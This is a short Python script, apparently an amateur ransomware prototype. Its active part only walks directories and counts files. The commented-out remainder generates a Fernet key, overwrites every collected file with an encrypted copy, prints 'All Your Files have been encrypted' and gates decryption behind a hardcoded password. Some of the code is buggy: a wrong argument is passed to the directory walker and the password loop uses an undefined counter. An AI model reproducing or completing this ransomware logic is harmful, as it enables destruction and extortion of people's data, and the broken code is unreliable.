import os
# from cryptography.fernet import Fernet


files = []


def files_in_directory(path):
    try:
        with os.scandir(path) as entries:
            for entry in entries:
                if entry.is_file():
                    files.append(entry)
                elif entry.is_dir():
                    files_in_directory(entry.path)
    except PermissionError:
        pass
files_in_directory(os.listdir())
# def files_in_system(root_path='/'):
#     files_in_directory(root_path)

# files_in_system()

print(len(files))
# for file in files:
#     if os.path.basename(file) == "do_not_run_bad.py" or os.path.basename(file) ==  "Do_not_run.py":
#         files.remove(file)

# key = Fernet.generate_key()

# for file in files:
#     with open(file,"rb") as thefile:
#         contents = thefile.read()
#     contents_enc = Fernet(key).encrypt(contents)
#     with open(file,"wb") as thefile:
#         thefile.write(contents_enc)


# def dec():
#     for file in files:
#         with open(file,"rb") as thefile:
#             contents = thefile.read()
#         contents_dec = Fernet(key).decrypt(contents)
#         with open(file,"wb") as thefile:
#             thefile.write(contents_dec)
# print("All Your Files have been encrypted")

# print("Enter Correct Password to decrypt:")

# inc_cnt = 0
# password = input()

# def passw(passg):
#     if inc_cnt == 5:
#         exit()
#     if passg == "tmkc":
#         dec()
#     else:
#         helm = input()
#         nc_cnt += 1
#         print("Wrong attempt. Enter Correct password:")
#         passw(helm)
        
